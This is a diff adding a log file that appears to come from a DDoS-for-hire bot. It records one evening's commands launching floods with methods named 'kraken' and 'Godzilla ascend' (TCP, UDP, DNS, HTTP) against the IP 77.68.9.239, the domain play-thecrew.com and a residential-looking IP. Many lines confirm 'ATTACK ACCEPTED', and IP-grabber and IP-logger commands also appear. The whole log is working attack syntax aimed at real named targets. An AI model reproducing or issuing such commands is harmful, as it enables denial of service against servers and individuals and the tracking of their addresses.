@@ -1,0 +1,46 @@
+[Thu Aug 27 2020 20:12:09 GMT-1100 (Samoa Standard Time)] /plan
+[Thu Aug 27 2020 20:15:43 GMT-1100 (Samoa Standard Time)] /ddos kraken mc-down 77.68.9.239 300 80
+[Thu Aug 27 2020 20:15:43 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 20:19:24 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 77.68.9.239 300 80
+[Thu Aug 27 2020 20:19:24 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 20:21:07 GMT-1100 (Samoa Standard Time)] /ddos godzilla squid 77.68.9.239 300
+[Thu Aug 27 2020 20:22:04 GMT-1100 (Samoa Standard Time)] /ddos godzilla TCP 77.68.9.239 300
+[Thu Aug 27 2020 20:22:21 GMT-1100 (Samoa Standard Time)] /ddos godzilla squid 77.68.9.239 120
+[Thu Aug 27 2020 20:22:40 GMT-1100 (Samoa Standard Time)] /ddos godzilla TCP 77.68.9.239 120
+[Thu Aug 27 2020 20:22:40 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 20:23:35 GMT-1100 (Samoa Standard Time)] /ddos godzilla TCP PLAY-THECREW.COM 120
+[Thu Aug 27 2020 20:23:56 GMT-1100 (Samoa Standard Time)] /PING PLAY-THECREW.COM
+[Thu Aug 27 2020 20:25:30 GMT-1100 (Samoa Standard Time)] /ddos kraken DNS 77.68.9.239 300
+[Thu Aug 27 2020 20:25:30 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 20:30:26 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla ascend 77.68.9.239 120
+[Thu Aug 27 2020 20:30:26 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 20:33:09 GMT-1100 (Samoa Standard Time)] /ddos kraken http play-thecrew.com 120
+[Thu Aug 27 2020 20:36:05 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla ascend 77.68.9.239 120 22
+[Thu Aug 27 2020 20:36:05 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 20:37:03 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla ascend 77.68.9.239 120 3389
+[Thu Aug 27 2020 20:38:15 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla ascend 77.68.9.239 120 3389
+[Thu Aug 27 2020 20:38:15 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 20:40:12 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla ascend 77.68.9.239 120 433
+[Thu Aug 27 2020 20:40:54 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla ascend 77.68.9.239 120 433
+[Thu Aug 27 2020 20:40:54 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 20:47:45 GMT-1100 (Samoa Standard Time)] /ping  play-thecrew.com
+[Thu Aug 27 2020 20:49:59 GMT-1100 (Samoa Standard Time)] /DDoS kraken tcpall 77.68.9.239 300
+[Thu Aug 27 2020 20:49:59 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 20:51:33 GMT-1100 (Samoa Standard Time)] /stop
+[Thu Aug 27 2020 20:52:07 GMT-1100 (Samoa Standard Time)] /checkip /DDoS 77.68.9.239
+[Thu Aug 27 2020 20:52:35 GMT-1100 (Samoa Standard Time)] /checkip 77.68.9.239
+[Thu Aug 27 2020 20:54:01 GMT-1100 (Samoa Standard Time)] /DDoS kraken updp77.68.9.239 60
+[Thu Aug 27 2020 20:54:11 GMT-1100 (Samoa Standard Time)] /DDoS kraken udp 77.68.9.239 60
+[Thu Aug 27 2020 20:54:11 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 20:55:06 GMT-1100 (Samoa Standard Time)] /ping play-thecrew.com
+[Thu Aug 27 2020 20:55:29 GMT-1100 (Samoa Standard Time)] /DDoS kraken udp 77.68.9.239 60 80
+[Thu Aug 27 2020 20:55:29 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 21:05:40 GMT-1100 (Samoa Standard Time)] /ping https://snoopdogg.com/
+[Thu Aug 27 2020 21:13:53 GMT-1100 (Samoa Standard Time)] /xboxcode
+[Thu Aug 27 2020 21:23:14 GMT-1100 (Samoa Standard Time)] /ipgrabber
+[Thu Aug 27 2020 21:23:46 GMT-1100 (Samoa Standard Time)] /iplogger
+[Thu Aug 27 2020 22:07:27 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla ascend 92.238.157.118 120 49330
+[Thu Aug 27 2020 22:10:20 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla ascend 92.238.157.118 120
+[Thu Aug 27 2020 22:10:58 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla ascend 92.238.157.118 6 49330
+[Thu Aug 27 2020 22:10:58 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 22:12:12 GMT-1100 (Samoa Standard Time)] /ping 92.238.157.118
